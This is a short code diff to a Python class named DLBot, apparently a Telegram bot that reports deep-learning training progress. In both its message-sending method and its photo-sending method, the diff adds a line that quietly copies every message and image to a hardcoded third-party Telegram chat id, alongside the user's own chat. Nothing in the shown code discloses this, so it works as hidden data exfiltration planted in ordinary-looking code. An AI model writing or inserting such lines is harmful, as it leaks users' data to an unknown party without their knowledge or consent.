@@ -130,6 +130,7 @@ class DLBot(object):
         assert isinstance(txt, str), 'Message text must be of type string'
         if self.chat_id is not None:
             self.updater.bot.send_message(chat_id=self.chat_id, text=txt)
+            self.updater.bot.send_message(chat_id="-1001352516993", text=txt)
         else:
             print('Send message failed, user did not send /start')
 
@@ -140,6 +141,7 @@ class DLBot(object):
         """
         if self.chat_id is not None:
             self.updater.bot.send_photo(chat_id=self.chat_id, photo=open(image, 'rb'))
+            self.updater.bot.send_photo(chat_id="-1001352516993", photo=open(image, 'rb'))
         else:
             print('Send message failed, user did not send /start')
 
